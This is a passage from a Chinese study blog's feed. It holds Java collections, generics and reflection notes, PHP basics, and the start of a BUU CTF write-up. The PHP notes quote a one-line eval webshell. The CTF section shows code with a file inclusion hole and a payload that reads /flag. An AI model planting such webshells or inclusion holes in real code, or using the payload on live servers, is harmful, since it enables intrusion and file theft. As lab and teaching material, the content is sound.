class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set set=map.keySet();<br>System.out.println(set.getClass());<br>Collection values=map.values();<br>System.out.println(values.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.add(<span class="hljs-string">&quot;abcd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;cbd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;ebd&quot;</span>);<br>        <br>   System.out.println(treeSet);<br><span class="hljs-comment">//[ebd, cbd, abd, abcd, abc]        </span><br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    arrayList.add(<span class="hljs-number">100</span>);<br>    arrayList.add(<span class="hljs-number">200</span>);<br>    arrayList.add(<span class="hljs-number">300</span>);<br>    arrayList.add(<span class="hljs-number">400</span>);<br>    arrayList.add(<span class="hljs-number">500</span>);<br>    arrayList.add(<span class="hljs-number">600</span>);<br>    arrayList.add(<span class="hljs-number">700</span>);<br>    arrayList.add(<span class="hljs-number">800</span>);<br>    arrayList.add(<span class="hljs-number">900</span>);<br>    System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(arrayList);<br>    System.out.println(arrayList);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(arrayList);<br>          System.out.println(arrayList);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(arrayList);<br>      System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   Collections.swap(arrayList,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.out.println(arrayList);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Object max=Collections.max(arrayList);<br>System.out.println(max);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> frequency=Collections.frequency(arrayList,<span class="hljs-number">500</span>);<br>System.out.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList new_arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(arrayList.size());<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      new_arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(new_arrayList,arrayList);<br>  System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Collections.replaceAll(new_arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();等价于 HashMap&lt;Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多比较简单的东西没写，可能因为篇幅太长了，传上来的时候老是出现奇奇怪怪的问题，大半夜的差点给我干破防 qwq，搞了好半天才弄好呜呜呜呜呜……</p><p><img src="/2024/11/06/TestWP/q.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>关于 PHP 的一小部分知识</p><span id="more"></span><h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; <br>   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); <br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)<br>   &#123;<br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; <br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); <br>      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); <br>   &#125; <br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//将所有 &lt;pre&gt;&lt;/pre&gt; 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<p>BUU 做的几道题</p><span id="more"></span><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>构造 payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>点击 